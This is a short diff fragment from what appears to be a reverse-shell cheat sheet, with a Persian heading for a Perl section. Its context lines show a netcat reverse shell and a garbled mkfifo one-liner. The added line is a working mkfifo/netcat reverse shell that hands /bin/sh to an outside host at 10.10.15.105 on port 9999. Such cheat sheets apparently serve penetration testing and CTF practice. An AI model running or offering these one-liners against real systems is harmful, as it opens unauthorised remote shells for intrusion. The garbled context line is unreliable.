@@ -83,6 +83,7 @@ nc -e /bin/sh 10.0.0.1 1234
 
 ```text
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.105 9999 >/tmp/f
 ```
 
 ### زبان Perl
